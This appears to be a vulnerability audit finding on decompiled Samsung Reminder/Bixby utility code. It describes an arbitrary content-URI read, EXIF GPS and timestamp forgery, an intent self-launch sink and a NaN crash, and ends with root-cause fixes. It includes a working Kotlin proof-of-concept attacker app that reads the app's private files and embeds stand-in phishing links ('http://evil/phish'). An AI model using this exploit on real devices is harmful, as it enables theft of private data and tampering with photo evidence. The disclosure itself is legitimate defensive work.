## [V-020] `W6.m` (BixbyUtils) â€” `.r()` Arbitrary-URI Read + EXIF Forgery into Reminder Sandbox; `.q()` Self-Intent Launch From Attacker Bundle

**File:** `sources/W6/m.java` (285 lines)
**Severity:** High â€” V-019 invokes `W6.m.r(ctx, bundle)` directly; this method executes the read primitive + persists tampered EXIF inside reminder-app storage.
**Class of flaw:** CWE-20 + CWE-22 (path-adjacent) + CWE-345 (EXIF integrity) + CWE-73 (external control of file name or path) + CWE-601/CWE-918 if the GeoPointUrl is later auto-resolved.

### Summary â€” `W6.m.r(Context, Bundle)` (lines 231â€“280)
```java
public static String r(Context context, Bundle bundle) {
    Uri uri = Uri.parse(bundle.getString("CreateParkingReminderAttachImageUri"));    // âš  attacker URI
    String dir = AbstractC3680n.m(context);
    String name = System.nanoTime() + "_" + AbstractC3680n.i(context, uri);          // filename: nanoTime + attacker-derived
    Point desired = new Point(900, 1200);
    Point src  = B.h(context, uri, name);                                            // reads image dims from attacker URI
    Bitmap bmp = B.l(context, uri, B.m(src, desired), src, name);                    // LOADS attacker image with reminder UID
    if (bmp == null)          return AbstractC3680n.d(context, uri, name);           // fallback: copy unscaled
    String savedPath = AbstractC3680n.t(bmp, dir, name, B.f(context, uri), 90);      // writes bitmap into reminder sandbox
    if (TextUtils.isEmpty(savedPath))    return AbstractC3680n.d(context, uri, name);
    try {
        ExifInterface exif = new ExifInterface(savedPath);
        long t = bundle.getLong("CreateParkingReminderAttachImageTime");             // attacker-forged timestamp
        if (t != 0) exif.setAttribute("DateTime", Long.toString(t));
        double[] gp = bundle.getDoubleArray("CreateParkingReminderAttachImageGeoPoint");  // attacker GPS
        if (gp != null && gp[0] != 0.0 && gp[1] != 0.0) {
            exif.setAttribute("GPSLatitude",  a(gp[0]));
            exif.setAttribute("GPSLatitudeRef",  gp[0] < 0 ? "S" : "N");
            exif.setAttribute("GPSLongitude", a(gp[1]));
            exif.setAttribute("GPSLongitudeRef", gp[1] < 0 ? "W" : "E");
        }
        exif.saveAttributes();                                                        // âš  PERSISTS attacker EXIF to disk
    } catch (IOException e) { ... }
    try {
        ParcelFileDescriptor pfd = ctx.getContentResolver().openFileDescriptor(uri, "r"); // âš  opens attacker URI
        try { B.a(pfd, savedPath, ""); ... }
    } catch (IOException e10) { ... }
    return AbstractC3680n.k(context, Uri.parse(AbstractC3680n.q(context, savedPath).toString()));
}
```

Four concrete primitives delivered in one method:

**(a) Attacker-URI read primitive.** `ctx.getContentResolver().openFileDescriptor(attackerUri, "r")` and `B.l(ctx, attackerUri, â€¦)` both run with the reminder app's UID. If the attacker supplies a `content://` URI that only the reminder app can resolve â€” for example `content://com.samsung.android.app.reminder.fileprovider/...` pointing at the app's own private data â€” the reminder app materialises those bytes into a bitmap and writes them into the attachment directory. A later read-back via V-004 / V-005 surfaces the file contents to the attacker. This is the concrete continuation of V-012 and V-019.

**(b) Reminder-sandbox file creation with attacker-influenced filename.** `AbstractC3680n.i(context, uri)` derives the filename segment from the attacker URI (typically DISPLAY_NAME from the content provider). The attacker can therefore write a file whose name they control into the reminder app's internal attachment directory. If any downstream component blindly concatenates this name into a path (e.g. for share-as or for cloud-sync, or for a content resolver filename comparison), this becomes a **path-injection source**.

**(c) EXIF forgery.** `exif.setAttribute("DateTime", â€¦)` and `exif.setAttribute("GPSLatitude/â€¦", â€¦)` with attacker-supplied values, followed by `exif.saveAttributes()`, **persist forged EXIF metadata on the reminder app's disk**. If the reminder later uploads this image (cloud sync / Outlook attachment / Graph sync â€” see V-010/V-013 context), the forged GPS and timestamp accompany it, enabling **evidence tampering** of where/when a photo was taken.

**(d) URI de-reference even when bitmap decode fails.** On bitmap decode failure the code falls back to `AbstractC3680n.d(context, uri, name)` (line 239/243) â€” another URI-read-and-save path. Attacker can therefore deliberately send a malformed image URI to explore both fallback branches.

### Summary â€” `W6.m.q(Context, Bundle, AlarmTime)` (lines 220â€“229)
```java
public static void q(Context context, Bundle bundle, AlarmTime alarmTime) {
    Intent intent = new Intent("com.samsung.android.app.reminder.action.requestNotificationPermission");
    intent.setPackage("com.samsung.android.app.reminder");
    intent.setFlags(335544320);            // FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP
    p(intent, bundle);                      // copies Bundle entries onto the Intent verbatim
    if (alarmTime != null) intent.putExtra("alarmTime", alarmTime);
    context.startActivity(intent);
}
```
`.p(intent, bundle)` (lines 182â€“218) copies a **curated but wide** set of Bundle entries onto the Intent:
- `CreateReminderText`        â†’ `android.intent.extra.TEXT`
- `CreateReminderPlaceRepeat` â†’ `locationRepeat`
- `CreateReminderNamedPlace == "here"` â†’ sets `fromHere=true` + `needCurrentLocation=true`
- `CreateReminderInAndOut`    â†’ `transitionType`
- `CreateReminderPlaceName`   â†’ `placeName`
- `CreateReminderNamedPlace`  â†’ `unifiedProfileType` (home/work/car â€” 1/2/3) âš  **same sink as V-018**
- `CreateReminderUtterance` / `CreateParkingReminderUtterance` â†’ `utterance`
- `CreateReminderUuid`        â†’ `uuid` âš  attacker-chosen UUID

If any exported Bixby handler reaches `W6.m.q(ctx, attackerBundle, alarmTime)`, the attacker can force a **self-launch** of the reminder app with an attacker-chosen UUID and an attacker-chosen `unifiedProfileType` â€” the same HOME/WORK exfiltration vector as V-018, but via the alternate `requestNotificationPermission` action. Reachability depends on whether `W6.m.q` is invoked with an attacker-influenced Bundle by another exported component; callers need to be traced (queued as follow-up).

### Ancillary primitives in `W6.m`
- **`W6.m.d(String)`** â€” base64-decodes attacker input and does `new DataInputStream(...).readUTF()`. The two-byte length prefix is synthesised by the code (`byteBuffer.putShort((short) bArrDecode.length).put(bArrDecode)`), so the expected `readUTF` length tag is forced correct regardless of attacker content â€” this limits classic Java ObjectInputStream-style attacks but still allows the attacker to supply arbitrary UTF-8 bytes that are then printed in logs unsanitised (`j("[BixbyUtils] converted reminder name(" + utf + ")")`).
- **`W6.m.a(Double)`** â€” converts a lat/lng double to the EXIF `d/1,m/1,s/1000` format. Throws `IllegalArgumentException` on NaN/out-of-range but is used in `r()` **after** unchecked `bundle.getDoubleArray(...)` â€” an attacker with `[Double.NaN, Double.NaN]` can crash the method before `saveAttributes()` is called, yielding a partial-write scenario that leaves the disk with an attacker-influenced image but without EXIF â€” another DoS variant.
- **`W6.m.s(Intent, Integer)`** â€” `intent.semSetLaunchOverTargetTask(num, false)`; Samsung-private launch-over flag. Not directly a sink but note it for cross-task exploitation if combined with a later `startActivity`.

### Attacker capability (chained)
1. Via V-001/V-015/V-016 â†’ V-017 â†’ V-019 â†’ **V-020**:
   - Attacker-supplied `CreateParkingReminderAttachImageUri` â†’ reminder app reads it with its UID (file read oracle).
   - Attacker-supplied GPS doubleArray â†’ EXIF forgery written to reminder sandbox.
   - Attacker-supplied timestamp â†’ EXIF forgery.
2. If `W6.m.q` is reachable, `CreateReminderUuid` = attacker-chosen â†’ reminder with predictable UUID â†’ attacker reads back via V-004/V-005.

### Proof-of-Concept â€” installed attacker app (zero-permission)
```kotlin
// Build the visionData Bundle that m9.e passes through to W6.m.r
val visionData = Bundle().apply {
    putString("CreateParkingReminderLocationName", "Your Car")
    putString("CreateParkingReminderGeoPointAddress", "Seoul, Gangnam-gu")
    putString("CreateParkingReminderGeoPointUrl", "http://evil/tap-here")
    putString("CreateParkingReminderUtterance", "Emergency: http://evil/phish")
    // (a) attacker-URI primitive â€” reminder app opens this URI with its UID:
    putString("CreateParkingReminderAttachImageUri",
        "content://com.samsung.android.app.reminder.fileprovider/internal/secret.jpg")
    // (c) EXIF forgery:
    putLong("CreateParkingReminderAttachImageTime", 1577836800000L)                 // 2020-01-01 UTC
    putDoubleArray("CreateParkingReminderAttachImageGeoPoint",
        doubleArrayOf(37.4219999, -122.0840575))                                    // attacker coords
}

val reach = Intent("com.samsung.android.app.reminder.action.addVisionReminder").apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"            // V-001 entry
    )
    putExtra("add_reminder_from_share", true)                                        // forces D.l share branch
    putExtra("uuid", "c0000000-0000-0000-0000-000000000001")
    putExtra("android.intent.extra.TEXT", "parking")                                 // required to avoid m9.c's EXTRA_TEXT NPE
    putExtra("visionData", visionData)
    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(reach)
```
Result:
* The reminder app reads `content://com.samsung.android.app.reminder.fileprovider/internal/secret.jpg` with its own UID (unreachable to the attacker directly).
* The bytes are re-saved inside reminder sandbox at an attachment path.
* EXIF on that saved file is overwritten with attacker `DateTime = 2020-01-01` and `GPSLatitude/Longitude`.
* An `AttachedFile(savedPath)` is added to a reminder whose UUID = `c0000000-â€¦-01`.
* Attacker re-opens reminder via V-004 (`content://com.samsung.android.app.reminder/viewcoverdetail?uuid=c0000000-â€¦-01`), the reminder app surfaces the AttachedFile; if attacker has accessibility/screenshot capability they exfiltrate the original bytes.

### DoS variant
Send the vision bundle with `CreateParkingReminderAttachImageGeoPoint = [Double.NaN, Double.NaN]` â†’ `W6.m.a(Double.NaN)` throws IllegalArgumentException inside `r()` try-block (wrapping IOException), bitmap-save succeeds but EXIF save fails â€” the reminder DB then contains an AttachedFile pointing at an orphan bitmap without EXIF; subsequent reminder rendering may crash trying to read the corrupted file.

### Root-cause fixes
1. Restrict the URI passed via `CreateParkingReminderAttachImageUri` to a strict allow-list of authorities (media provider, Samsung vision provider) and explicitly reject `com.samsung.android.app.reminder.fileprovider` self-resolution.
2. Drop attacker-supplied EXIF fields entirely; if timestamp/GPS are needed, derive them from the validated source URI (ContentResolver MediaStore columns from a trusted provider), never from bundle extras.
3. Do not `openFileDescriptor(attackerUri, "r")` with the reminder app's UID unless the URI authority is whitelisted.
4. Gate `W6.m.q` on caller-package check before launching `requestNotificationPermission` with a bundle.
5. Replace `W6.m.a(...)` unchecked NaN handling with defensive early-return rather than throw.

